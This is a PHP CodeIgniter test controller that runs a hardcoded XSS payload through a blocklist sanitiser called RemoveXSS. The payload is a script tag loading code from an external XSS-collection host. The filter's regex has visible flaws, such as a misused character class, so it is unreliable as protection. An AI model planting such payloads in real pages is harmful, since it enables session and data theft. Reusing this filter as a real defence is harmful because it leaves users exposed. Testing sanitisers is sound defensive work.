<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class test extends CI_Controller {

	public function __construct()
    {
        parent::__construct();

    }
	public function index()
	{
		// 获取用户当前回复  //过滤不重要回复
		
		//$d= $this->mail->send("93411338@qq.com","小明来了没有呀",time()."afssd撒地方拉丝机对方");
		
		$d="<script?src=http://xss.hacktask.net/Xo2B7G?1427620966></script>";
		echo $this->RemoveXSS($d);
	}
	function RemoveXSS($val) {  
 
		   $val = preg_replace('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/', '', $val);  
		
		   $search = 'abcdefghijklmnopqrstuvwxyz'; 
		   $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  
		   $search .= '1234567890!@#$%^&*()'; 
		   $search .= '~`";:?+/={}[]-_|\'\\'; 
		   for ($i = 0; $i < strlen($search); $i++) { 
			 
			  $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val);
		
			  $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); 
		   } 
		
		 
		   $ra1 = Array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base'); 
		   $ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); 
		   $ra = array_merge($ra1, $ra2); 
		
		   $found = true;
		   while ($found == true) { 
			  $val_before = $val; 
			  for ($i = 0; $i < sizeof($ra); $i++) { 
				 $pattern = '/'; 
				 for ($j = 0; $j < strlen($ra[$i]); $j++) { 
					if ($j > 0) { 
					   $pattern .= '(';  
					   $pattern .= '(&#[xX]0{0,8}([9ab]);)'; 
					   $pattern .= '|';  
					   $pattern .= '|(&#0{0,8}([9|10|13]);)'; 
					   $pattern .= ')*'; 
					} 
					$pattern .= $ra[$i][$j]; 
				 } 
				 $pattern .= '/i';  
				 $replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2);
				 $val = preg_replace($pattern, $replacement, $val); 
				 if ($val_before == $val) {  
				  
					$found = false;  
				 }  
			  }  
		   }  
		   return $val;  
		}   

	
	
}
